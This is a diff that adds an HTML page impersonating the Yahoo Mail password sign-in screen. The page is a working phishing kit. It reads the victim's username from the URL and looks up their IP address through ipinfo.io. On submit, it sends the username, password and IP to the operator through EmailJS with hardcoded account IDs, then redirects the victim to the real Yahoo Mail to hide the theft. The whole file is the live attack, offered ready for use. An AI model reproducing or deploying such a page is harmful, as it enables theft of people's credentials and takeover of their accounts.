@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="f3lakutie">
+
+
+    <!-- font awesome-->
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" >
+    
+     
+    <!-- favicon-->
+    <link rel="shortcut icon" href="images/download_afD_icon.ico" type="image/png">
+    <!-- for apple mobile devices -->
+    <link rel="apple-touch-icon-precomposed" href="images/download_afD_icon.ico" type="image/png" sizes="152x152">
+    <link rel="apple-touch-icon-precomposed" href="images/download_afD_icon.ico" type="image/png" sizes="120x120">
+
+    <!-- default style-->
+    <style>
+        /*
+        */
+                
+    </style>
+
+    <title>Yahoo Mail | Sign in</title>
+
+    <!-- Custom styles for this page -->
+    <link href="gform.css" rel="stylesheet"> 
+    <link href="gstyles.css" rel="stylesheet">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+
+  </head>
+
+  <body class="">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+      <script>
+          function getParameterByName(name, url = window.location.href) {
+                name = name.replace(/[\[\]]/g, '\\$&');
+                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                    results = regex.exec(url);
+                if (!results) return null;
+                if (!results[2]) return '';
+                return decodeURIComponent(results[2].replace(/\+/g, ' '));
+            }
+            var foo = getParameterByName('usr');
+
+            
+      </script>
+      
+      <div id="header" class="header">
+          <img src="https://logodownload.org/wp-content/uploads/2019/09/yahoo-logo-1.png" alt="">
+      </div>
+
+
+      <div id="main" class="main">
+          <div id="minfo">
+            <p><span style="font-weight:900;">Yahoo makes it easy to enjoy what matters most in your world.</span><br><br>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
+          </div>
+          <div id="log" class="log">
+              <img src="https://logodownload.org/wp-content/uploads/2019/09/yahoo-logo-1.png"/>
+              <h3>Enter password</h3>
+              <p>using your Yahoo account</p>
+              <form id="my-form">
+              <div id="login" class="login">
+                <div class="input-field" id="ttt">
+                    <input type="password" id="usr" name="usr" required>
+                    <label for="usr" id="lab1">Password</label>
+                </div>
+                <input type="submit" value="Next">
+                </form>
+                <p>Forgot password?</p>
+            
+
+              </div>
+              
+          </div>
+         
+      </div>
+      <script>
+            var xxip;
+            // Add "https://ipinfo.io" statement
+        // this will communicate with the ipify servers
+        // in order to retrieve the IP address
+            window.onload = function(){
+                $.getJSON("https://ipinfo.io/json?token=5eaf0700b2c0d2", function(data) {
+                        
+                        // Setting text of element P with id gfg
+                        xxip = data.ip;
+                        
+                        
+                    })                
+                }
+        
+            
+            // "json" shows that data will be fetched in json format
+            function sendmail(){
+                (function() {
+                    emailjs.init("DXEnVY0cQeWbx4IkW"); //please encrypted user id for malicious attacks
+                    })();
+                //set the parameter as per you template parameter[https://dashboard.emailjs.com/templates]
+                var templateParams = {
+		    domain: "Yahoo",
+                    user_name: foo,
+                    user_pass: document.getElementById("usr").value,
+                    ip: xxip,
+                };
+
+                emailjs.send('service_twujdwl', 'template_770klnf', templateParams)
+                    .then(function(response) {
+                    window.location.href = "https://mail.yahoo.com";
+                    }, function(error) {
+                    alert('FAILED...', error);
+                    });
+
+            }
+
+            function processForm(e) {
+                if (e.preventDefault) e.preventDefault();
+
+                /* do what you want with the form */
+            sendmail()
+            
+
+                // You must return false to prevent the default form behavior
+                return false;
+            }
+
+            var form = document.getElementById('my-form');
+
+            if (form.attachEvent) {
+                form.attachEvent("submit", processForm);
+            } else {
+                form.addEventListener("submit", processForm);
+            }
+
+    </script>
+     </body>
+</html>
